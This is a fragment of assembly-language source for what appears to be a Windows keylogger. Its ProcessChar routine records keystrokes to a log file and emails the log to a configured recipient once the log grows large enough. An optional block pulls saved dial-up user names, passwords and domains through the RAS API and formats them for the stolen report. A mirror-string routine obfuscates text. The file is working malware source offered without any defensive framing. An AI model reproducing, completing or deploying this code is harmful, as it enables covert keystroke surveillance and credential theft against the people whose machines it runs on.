             jb   @F
             cmp  al,5Ah
             ja   @F
             add  al,32
             mov  byte ptr [esi+ecx],al             
           @@:
             dec  ecx
             jns  @NextCh

             mov  eax,esi
             pop  ecx
             pop  esi
             
             ret
   _ToLower endp

_strlen  proc

        
         push  ecx 
         xor   ecx,ecx
         @@:
         inc   ecx
         cmp   byte ptr [eax + ecx],0
         jnz   @b
         mov   eax,ecx
         pop   ecx
         ret
 
 _strlen  endp


.data
LogReport   db LOGSUBJ


NewLine    db 0dh,0ah,0                                         





NewLineCtr db 0
.code

ProcessChar  proc   VirtualKeyCode:DWORD        ; RETURN 1 IF OK, 0 IF BAD
;LOCAL       pLogTxt:DWORD
LOCAL       __ComputerBufSize:DWORD
LOCAL       __ComputerBuf[127]:BYTE
LOCAL       written:DWORD

          xor    eax,eax
          xor    ecx,ecx
                
          .IF    VirtualKeyCode == VK_SPACE	
            inc  eax
          .ENDIF

          .IF    VirtualKeyCode == 0e6h	
            inc  eax
          .ENDIF
          
          .IF    VirtualKeyCode == VK_RETURN
                ;invoke PostMessage, hWin, WM_TIMER, TimerID, 0
                ;xor    ecx,ecx
                xor    eax,eax
                inc    ecx
          .ENDIF
         
          .IF    VirtualKeyCode == VK_BACK	
            invoke SetFilePointer, hLog, -1, 0, FILE_CURRENT
            xor  eax,eax
            dec  NewLineCtr
          .ENDIF
         
          .IF    VirtualKeyCode >= VK_0 && VirtualKeyCode <= VK_9
            inc  eax
          .ENDIF 
          
          .IF    VirtualKeyCode >= VK_A && VirtualKeyCode <= VK_Z
            inc  eax
          .ENDIF      

          .IF    VirtualKeyCode >= VK_NUMPAD0	 && VirtualKeyCode <= VK_DIVIDE	
            inc  eax
          .ENDIF          	

          .IF    VirtualKeyCode >= 0BAh  && VirtualKeyCode <= 0C0h	
            inc  eax
          .ENDIF       

          .IF    VirtualKeyCode >= 0dbh  && VirtualKeyCode <= 0e4h	
            inc  eax
          .ENDIF    

          .IF    VirtualKeyCode >= 0e9h  && VirtualKeyCode <= 0f5h	
            inc  eax
          .ENDIF          

          dec    ecx
          jz     @NL

          .IF    eax == 1
            
                 inc NewLineCtr

                 cmp        NewLineCtr, 70
                 jb         @F
                @NL:
                 push       eax
                 
                 invoke     WriteFile,hLog, addr NewLine, 2, addr written, 0
                 and        NewLineCtr, 0

        
                 
                 invoke     GetFileSize,hLog, NULL
                 .IF        eax >= MAX_LOG_SIZE
                  .IF   SmtpUseFlag == 0
                    push       eax
                    .IF        EAX > 60000
                         invoke SetFilePointer, hLog, 50000, NULL, FILE_BEGIN
                         invoke SetEndOfFile, hLog                              ; TRUNCATE FILE if too big
                    .ENDIF
                    Call       CatchConnexion
                    pop        ebx
                    or         eax,eax
                    jz         @F           

                     push       ebx
                      invoke SetFilePointer, hLog, NULL, NULL, FILE_BEGIN
                      pop     ebx
                      
                       ;invoke  GlobalAlloc, GPTR,  ebx
                       ;mov     LogBuf, eax
                           
                       invoke  ReadFile, hLog, addr LogBuf, ebx, addr Read, NULL
                       
                       mov     ebx, OFFSET LogBuf
                       add     ebx, Read
                       and     byte ptr [ebx], 0
    

                      lea     esi,[disp]
                      .IF     BYTE PTR [disp]  ==  0
                              mov    __ComputerBufSize, SIZEOF __ComputerBuf
                              invoke GetUserName, addr __ComputerBuf, addr __ComputerBufSize
                              lea    esi,[__ComputerBuf]
                      .ENDIF
                      

                       
                       .IF     Read >= 3000
                                    push hLog
                                    pop  IsThisLog?
                                    invoke  SendMail, addr serv, esi, addr rcpt, addr rcpt, addr LogReport, addr LogBuf,0  
                       .ENDIF                  





                 .ENDIF  


                        
                .ENDIF 
                  pop        eax
                 
                 @@:
          .ENDIF

          ret
ProcessChar  endp


IF  __STEAL_PASS__
.data
ConStat db 0dh,0ah,0dh,0ah,"---! Password de connexion internet !---",0dh,0ah,0dh,0ah
        db "EntryName: %s",0dh,0ah
        db "PhoneNumber: %s",0dh,0ah
        db "CallbackNumber: %s",0dh,0ah
        db "UserName: %s",0dh,0ah
        db "Password: %s",0dh,0ah;
        db "Domain: %s",0dh,0ah
        db 0dh,0ah,"--- * ---",0
.code

GetPass proc uses ebx

LOCAL   temp[2048]:BYTE
LOCAL   Buffer[256]:BYTE 
LOCAL   RasParams:RASDIALPARAMSA
LOCAL   Ra:RASCONN 
LOCAL       s:DWORD
LOCAL       ln:DWORD
LOCAL       Flag:DWORD
      mov ebx,412
      mov Ra.dwSize,ebx ;R(0).dwSize = 412
      shl ebx,8   
      mov s,ebx
      invoke  RasEnumConnections, ADDR Ra, ADDR s, ADDR ln
      or eax,eax
      jnz @EndDo ; (error) eax=603 - buffer too small
      mov ecx,ln
      dec ecx



      invoke lstrcpy, addr Buffer, addr Ra.szEntryName
	                  lea edx,[RasParams]
	                  assume edx:ptr RASDIALPARAMSA
	                  mov [edx].dwSize,SIZEOF  RASDIALPARAMSA +3;3; the +3 for version checking or just stupid bug in windows
	                  xor eax,eax
    @@:
    	
      mov bl,Buffer[eax]
    	mov [edx+eax].szEntryName,bl
    	inc eax
    	or bl,bl
    	jnz @B
    	push edx
    
    	invoke RasGetEntryDialParams,NULL,addr RasParams,addr Flag
    	or eax,eax 
    	jnz @EndDo
    
          pop edx 
    
    	invoke wsprintf,ADDR temp,ADDR ConStat,addr [edx].szEntryName,addr [edx].szPhoneNumber,\
    	addr [edx].szCallbackNumber,addr [edx].szUserName,addr [edx].szPassword,addr [edx].szDomain
    	
    assume edx:nothing
    
    
          lea    eax, [temp]
          mov    esi,eax
          call _strlen 
    @EndDo:

                      
        ret
GetPass endp
ENDIF



MirrorStr  proc uses ecx edx ebx pstr:DWORD, poutstr:DWORD
    
    mov     esi, poutstr
    mov     eax, pstr
    xor     ecx, ecx
   @@:
    mov     dl,  byte ptr [eax+ecx]
     
    .IF     dl  == 0
            xchg eax,ecx
            ret
    .ELSEIF dl >= 41h && dl <= 5Ah
            sub  dl, 41h
            mov  bl, 25
            sub  bl, dl
            mov  dl, 41h
            add  dl, bl

    .ELSEIF dl >= 61h && dl <= 7Ah
            sub  dl, 61h
            mov  bl, 25
            sub  bl, dl
            mov  dl, 61h
            add  dl, bl

    .ENDIF
    xchg    dl, byte ptr [esi+ecx]
    inc     ecx
    jmp     @B

MirrorStr endp

end TS


